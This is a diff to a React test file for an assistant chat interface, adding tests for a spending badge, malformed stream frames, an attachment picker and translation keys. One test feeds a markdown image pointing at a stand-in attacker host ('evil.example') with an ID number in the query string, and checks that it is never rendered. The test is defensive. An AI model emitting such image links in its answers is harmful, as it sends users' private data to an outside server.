@@ -96,6 +96,7 @@ vi.mock("@/components/ui/sidebar", () => {
 import { AppSidebar } from "@/components/app-sidebar";
 import { ApiError } from "@/web/api/client";
 import { AllowanceBadge } from "@/web/components/assistant/allowance-badge";
+import { AttachmentPicker } from "@/web/components/assistant/attachment-picker";
 import { ChatThread } from "@/web/components/assistant/chat-thread";
 import { Composer } from "@/web/components/assistant/composer";
 import { JiraDraftForm } from "@/web/components/assistant/jira-draft-form";
@@ -133,7 +134,10 @@ class FakeEventSource {
     this.readyState = FakeEventSource.CLOSED;
   }
   emit(type: string, data: unknown) {
-    const event = new MessageEvent(type, { data: JSON.stringify(data) });
+    this.emitRaw(type, JSON.stringify(data));
+  }
+  emitRaw(type: string, data: string) {
+    const event = new MessageEvent(type, { data });
     for (const listener of this.listeners.get(type) ?? []) listener(event);
   }
 }
@@ -256,6 +260,13 @@ describe("daily cap", () => {
       />
     );
     expect(text()).toBe("Left today: $1.25");
+  });
+
+  it("the badge never rounds a last fraction of a cent to $0.00", async () => {
+    await render(
+      <AllowanceBadge allowance={{ ...allowance, remainingUsd: 0.004 }} />
+    );
+    expect(text()).toBe("Left today: < $0.01");
   });
 
   it("the badge shows the cap message with the reset in local time", async () => {
@@ -522,6 +533,16 @@ describe("answer stream", () => {
     expect(FakeEventSource.instances).toHaveLength(1);
   });
 
+  it("closes on a malformed frame and refetches", async () => {
+    queryClient.setQueryData(key, conversation("streaming"));
+    const invalidate = vi.spyOn(queryClient, "invalidateQueries");
+    await render(<ChatThread conversationId="c1" />);
+    const [source] = FakeEventSource.instances;
+    await act(async () => source?.emitRaw("snapshot", "{not json"));
+    expect(source?.closed).toBe(true);
+    expect(invalidate).toHaveBeenCalledWith({ queryKey: key });
+  });
+
   it("closes on not-found and on unmount", async () => {
     queryClient.setQueryData(key, conversation("streaming"));
     await render(<ChatThread conversationId="c1" />);
@@ -571,6 +592,93 @@ describe("answer stream", () => {
     expect(link?.getAttribute("target")).toBe("_blank");
     expect(link?.getAttribute("rel")).toContain("noopener");
   });
+
+  it("never loads a markdown image (no img, no preload)", async () => {
+    queryClient.setQueryData(key, {
+      ...conversation("done"),
+      messages: conversation("done").messages.map((m) =>
+        m.id === "m2"
+          ? {
+              ...m,
+              content:
+                "Lihat ![x](https://example.com/a.png) dan ![](https://evil.example/p?d=NIK123)",
+            }
+          : m
+      ),
+    });
+    await render(<ChatThread conversationId="c1" />);
+    expect(document.querySelector("img")).toBeNull();
+    expect(document.querySelector('link[rel="preload"]')).toBeNull();
+    expect(document.documentElement.innerHTML).not.toContain(
+      "example.com/a.png"
+    );
+    expect(document.documentElement.innerHTML).not.toContain("NIK123");
+    expect(text()).toContain("Lihat x dan");
+  });
+});
+
+describe("attachment picker", () => {
+  it("shows already-picked attachments locked and counts them in the limit", async () => {
+    queryClient.setQueryData(
+      ["assistant", "listIssueAttachments", ["e1", "KST-1"]],
+      {
+        key: "KST-1",
+        unavailable: false,
+        attachments: [
+          {
+            id: "1",
+            filename: "a.xlsx",
+            mime: "application/xlsx",
+            sizeBytes: 10,
+          },
+          {
+            id: "2",
+            filename: "b.pdf",
+            mime: "application/pdf",
+            sizeBytes: 20,
+          },
+          { id: "3", filename: "c.png", mime: "image/png", sizeBytes: 30 },
+        ],
+      }
+    );
+    const onAdd = vi.fn();
+    await render(
+      <AttachmentPicker
+        environmentId="e1"
+        open
+        onOpenChange={() => {}}
+        max={2}
+        picked={new Set(["1"])}
+        onAdd={onAdd}
+      />
+    );
+    const input = document.querySelector<HTMLInputElement>(
+      "#assistant-issue-key"
+    );
+    if (!input) throw new Error("no input");
+    await act(async () => {
+      Object.getOwnPropertyDescriptor(
+        HTMLInputElement.prototype,
+        "value"
+      )?.set?.call(input, "kst-1");
+      input.dispatchEvent(new Event("input", { bubbles: true }));
+    });
+    await act(async () => button(t.showAttachments)?.click());
+    const box = (id: string) =>
+      document.querySelector(
+        `[role="checkbox"][aria-labelledby="assistant-attachment-${id}-label"]`
+      );
+    expect(box("1")?.getAttribute("aria-checked")).toBe("true");
+    expect(box("1")?.hasAttribute("data-disabled")).toBe(true);
+    // One slot left of two: ticking b.pdf locks c.png.
+    await act(async () => (box("2") as HTMLElement | null)?.click());
+    expect(box("2")?.getAttribute("aria-checked")).toBe("true");
+    expect(box("3")?.hasAttribute("data-disabled")).toBe(true);
+    await act(async () => button("Use 1 attachment")?.click());
+    expect(onAdd).toHaveBeenCalledWith([
+      { id: "2", filename: "b.pdf", issueKey: "KST-1" },
+    ]);
+  });
 });
 
 describe("assistant messages", () => {
@@ -579,6 +687,8 @@ describe("assistant messages", () => {
       assistant: Record<string, string>;
       assistantErrors: Record<string, string>;
       breadcrumbs: Record<string, string>;
+      nav: Record<string, string>;
+      common: Record<string, string>;
     };
   const en = load("en");
 
@@ -595,24 +705,37 @@ describe("assistant messages", () => {
         expect(value.trim().length).toBeGreaterThan(0);
       }
       expect(m.breadcrumbs.assistant?.length).toBeGreaterThan(0);
+      expect(m.nav.assistant?.length).toBeGreaterThan(0);
     });
   }
 
   it("every key the components use exists", () => {
     const dir = "web/components/assistant";
-    const used = new Set<string>();
-    for (const file of readdirSync(dir)) {
-      const source = readFileSync(`${dir}/${file}`, "utf8");
+    // `t` / `tAssistant` read `assistant`; `tErrors` `assistantErrors`;
+    // `tCommon` `common`.
+    const namespaces: Record<string, Record<string, string>> = {
+      t: en.assistant,
+      tAssistant: en.assistant,
+      tErrors: en.assistantErrors,
+      tCommon: en.common,
+    };
+    const files = [
+      ...readdirSync(dir).map((f) => `${dir}/${f}`),
+      "web/routes/$locale/_app/$projectKey.$envSlug.assistant.tsx",
+    ];
+    const missing: string[] = [];
+    let used = 0;
+    for (const file of files) {
+      const source = readFileSync(file, "utf8");
       for (const match of source.matchAll(
-        /\bt(?:Assistant)?\("([a-zA-Z]+)"/g
+        /\b(t|tAssistant|tErrors|tCommon)\("([a-zA-Z]+)"/g
       )) {
-        if (match[1]) used.add(match[1]);
+        const [, fn = "", key = ""] = match;
+        used++;
+        if (!(key in (namespaces[fn] ?? {}))) missing.push(`${fn}:${key}`);
       }
     }
-    expect(used.size).toBeGreaterThan(20);
-    const missing = [...used].filter(
-      (k) => !(k in en.assistant) && !(k in en.assistantErrors)
-    );
+    expect(used).toBeGreaterThan(20);
     expect(missing).toEqual([]);
   });
 });
